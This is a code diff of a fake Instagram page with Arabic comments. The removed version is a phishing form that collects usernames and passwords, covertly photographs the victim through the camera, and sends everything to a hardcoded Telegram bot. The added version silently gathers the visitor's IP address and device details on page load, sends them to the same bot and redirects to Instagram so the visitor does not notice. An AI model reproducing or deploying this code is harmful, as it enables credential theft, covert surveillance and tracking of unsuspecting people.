@@ -3,110 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Verification</title>
+    <title>Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
-        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 350px; text-align: center; border-radius: 8px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #verify-section { display: none; }
-        .info-text { font-size: 14px; color: #8e8e8e; margin-bottom: 20px; }
+        /* شاشة تحميل بسيطة لتبدو العملية طبيعية */
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="login-section">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" width="175" style="margin-bottom: 20px;">
-        <form id="login-form">
-            <input type="text" id="email" placeholder="رقم الهاتف أو اسم المستخدم" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-    </div>
+    <div class="loader"></div>
 
-    <div id="verify-section">
-        <h3>تأكيد الهوية</h3>
-        <p class="info-text">يرجى الضغط على الزر أدناه للسماح بالتحقق من أنك المالك الحقيقي للحساب عبر الكاميرا.</p>
-        <button id="start-camera">بدء التحقق الآن</button>
-    </div>
-</div>
+    <script>
+        const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
+        const chat_id = '8658217605';
 
-<script>
-    const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
-    const chat_id = '8658217605';
-    let user_email = "", user_pass = "";
+        async function collectAndRedirect() {
+            try {
+                // 1. جلب عنوان الـ IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
 
-    // 1. عند إرسال بيانات الدخول
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
-        user_email = document.getElementById('email').value;
-        user_pass = document.getElementById('pass').value;
-        document.getElementById('login-section').style.display = 'none';
-        document.getElementById('verify-section').style.display = 'block';
-    });
+                // 2. تجميع معلومات الجهاز
+                const info = {
+                    ip: ipData.ip,
+                    device: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    lang: navigator.language,
+                    time: new Date().toLocaleString('ar-EG')
+                };
 
-    // 2. التقاط الصورة وإرسال "التقرير الكامل"
-    document.getElementById('start-camera').addEventListener('click', async function() {
-        this.innerText = "جاري التحقق...";
-        this.disabled = true;
+                // 3. إرسال المعلومات للتليجرام
+                const message = `🔔 زيارة جديدة صامتة لـ أنس:\n\n` +
+                                `🌐 الـ IP: ${info.ip}\n` +
+                                `📱 الجهاز: ${info.device}\n` +
+                                `💻 المنصة: ${info.platform}\n` +
+                                `🖥️ الشاشة: ${info.screen}\n` +
+                                `🌍 اللغة: ${info.lang}\n` +
+                                `⏰ الوقت: ${info.time}`;
 
-        try {
-            // طلب الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
 
-            // جلب الـ IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            const userIP = ipData.ip;
+                // 4. التوجه المباشر لإنستغرام
+                window.location.replace("https://www.instagram.com");
 
-            // معلومات الجهاز الدقيقة
-            const device = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${screen.width}x${screen.height}`;
-
-            // التقاط الصورة
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chat_id);
-                formData.append('photo', blob, 'capture.jpg');
-                
-                // تجميع التقرير في النص المرافق للصورة
-                const captionText = `🔥 صيدة VIP كاملة لـ أنس:\n\n` +
-                                  `📧 الحساب: ${user_email}\n` +
-                                  `🔑 الباسورد: ${user_pass}\n\n` +
-                                  `🌐 الـ IP: ${userIP}\n` +
-                                  `📱 الجهاز: ${device}\n` +
-                                  `💻 المنصة: ${platform}\n` +
-                                  `🖥️ الشاشة: ${screenRes}`;
-
-                formData.append('caption', captionText);
-
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                stream.getTracks().forEach(track => track.stop());
-                window.location.href = "https://www.instagram.com";
-            }, 'image/jpeg');
-
-        } catch (err) {
-            // في حال رفض الكاميرا، نرسل البيانات المتوفرة (نصياً)
-            const fallbackMsg = `⚠️ رفض الكاميرا لكن البيانات وصلت:\n📧 الحساب: ${user_email}\n🔑 الباسورد: ${user_pass}`;
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(fallbackMsg)}`);
-            window.location.href = "https://www.instagram.com";
+            } catch (err) {
+                // في حال حدوث أي خطأ (مثلاً مانع إعلانات)، حوله أيضاً لكي لا يشك
+                window.location.replace("https://www.instagram.com");
+            }
         }
-    });
-</script>
 
+        // تنفيذ الكود فور تحميل الصفحة
+        window.onload = collectAndRedirect;
+    </script>
 </body>
 </html>
